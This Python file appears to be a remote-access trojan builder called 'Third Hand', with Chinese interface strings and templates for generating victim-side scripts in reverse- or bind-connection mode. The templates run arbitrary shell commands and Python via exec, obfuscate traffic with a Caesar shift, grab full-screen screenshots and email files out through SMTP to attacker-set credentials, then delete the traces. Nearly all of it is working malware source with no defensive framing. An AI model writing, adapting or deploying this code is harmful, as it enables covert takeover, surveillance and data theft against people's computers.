LOGO_STR = """
     _____ _     _         _   _   _                 _ 
    |_   _| |__ (_)_ __ __| | | | | | __ _ _ __   __| |
      | | | '_ \| | '__/ _` | | |_| |/ _` | '_ \ / _` |
      | | | | | | | | | (_| | |  _  | (_| | | | | (_| |
      |_| |_| |_|_|_|  \__,_| |_| |_|\__,_|_| |_|\__,_|
                                                
                                                V 1.0
    """

STRINGS = {
    "zh_CN": {
        "str_help_for_help": "显示帮助信息",
        "str_help_for_create": "生成被控端脚本",
        "str_help_for_connect": "连接被控端脚本",
        "str_help_for_exit": "退出",
        "str_mode_description": "模式有 1 与 2 两种\n1 —— 反向连接\n2 —— 正向连接",
        "str_input_host_addr": "请输入本机的IP：",
        "str_input_host_port": "请输入一个端口号：",
        "str_input_others_addr": "请输入被控端的IP：",
        "str_input_others_port": "请输入被控端的端口：",
        "str_arg_not_found": "%s没有该参数：%s",
        "str_command_not_found": "%s没有此命令：%s",
        "str_listening": "正在监听此端口",
        "str_word_mode": "模式",
        "str_word_path": "路径",
        "str_arg_not_enough": "提供给%s命令的参数个数不足：预期%d个，实际%d个",
    },
}

CODE_SLICE_0 = """
t = socket.socket()
t.bind(("",%s))
t.listen(1)
print("正在监听此端口")
c,ip = t.accept()
while True:
    cmd = input('$>')
    if cmd == '':print('')
    else:
        c.send(Caesar(0,cmd).encode("gbk"))
        print(Caesar(1,c.recv(2048).decode("gbk")))
c.close()
t.close()
"""
CODE_SLICE_1 = """
t = socket.socket()
t.connect(("%s",%s))
while True:
    cmd = input("$>")
    if cmd == "":print("")
    else:
        t.send(Caesar(0,cmd).encode("gbk"))
        print(Caesar(1,t.recv(2048).decode("gbk")))
t.close()
"""

CODE_SLICE_2 = """
# coding=utf-8
import socket,smtplib,subprocess
from os import remove
from tkinter import Tk
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
host = ""
port = ""
name = ""
password = ""
def Caesar(i,string1):
    string2 = ""
    if i == 0:
        for a in string1:string2 = string2 + chr(ord(a)+4)
    elif i == 1:
        for a in string1:string2 = string2 + chr(ord(a)-4)
    return string2
def Shell(cmd):
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read().decode("gbk")
    err = shell.stderr.read().decode("gbk")
    if out == "" and err == "":
        out = " "
    return out+err
def Get(file1):
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,password)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return "OK"
def Win():
    windown = Tk()
    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
    jpg.save("./.win.jpg")
    ret = Get("./.win.jpg")
    remove("./.win.jpg")
if "__main__" == __name__:
    t = socket.socket()
    try:
        t.connect(("%s",%s))
        while True:
            cmd = Caesar(1,t.recv(2048).decode("gbk")).split(" ",1)
            if cmd[0] == "shell":
                t.send(Caesar(0,Shell(cmd[1])).encode("gbk"))
            elif cmd[0] == "get":
                t.send(Caesar(0,Get(cmd[1])).encode("gbk"))
            elif cmd[0] == "win":
                t.send(Caesar(0,Win()).encode("gbk"))
            elif cmd[0] == "py":
                exec(cmd[1])
                t.send(Caesar(0,"OK").encode("gbk"))
        t.close()
    except:
        exit()
"""
CODE_SLICE_3 = """
# coding=utf-8
import socket,smtplib,subprocess
from os import remove
from tkinter import Tk
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
host = ""
port = ""
name = ""
password = ""
def Caesar(i,string1):
    string2 = ""
    if i == 0:
        for a in string1:string2 = string2 + chr(ord(a)+4)
    elif i == 1:
        for a in string1:string2 = string2 + chr(ord(a)-4)
    return string2
def Shell(cmd):#执行shell
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read().decode("gbk")
    err = shell.stderr.read().decode("gbk")
    if out == "" and err == "":
        out = " "
    return out+err
def Get(file1):
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,password)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return "OK"
def Win():
    windown = Tk()
    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
    jpg.save("./.win.jpg")
    ret = Get("./.win.jpg")
    remove("./.win.jpg")
if "__main__" == __name__:
    t = socket.socket()
    t.bind(("",%s))
    t.listen(1)
    c,ip = t.accept()
    while True:
        cmd = Caesar(1,c.recv(2048).decode("gbk")).split(" ",1)
        if cmd[0] == "shell":
            c.send(Caesar(0,Shell(cmd[1])).encode("gbk"))
        elif cmd[0] == "get":
            c.send(Caesar(0,Get(cmd[1])).encode("gbk"))
        elif cmd[0] == "win":
            c.send(Caesar(0,Win()).encode("gbk"))
        elif cmd[0] == "py":
            exec(cmd[1])
            c.send(Caesar(0,"OK").encode("gbk"))
    c.close()
    t.close()
"""

MAIN_PROMPT = "Third-Hand $"

PROMPT_CHARACTER = "> "

# Functions
def gp(s):
    return s + PROMPT_CHARACTER
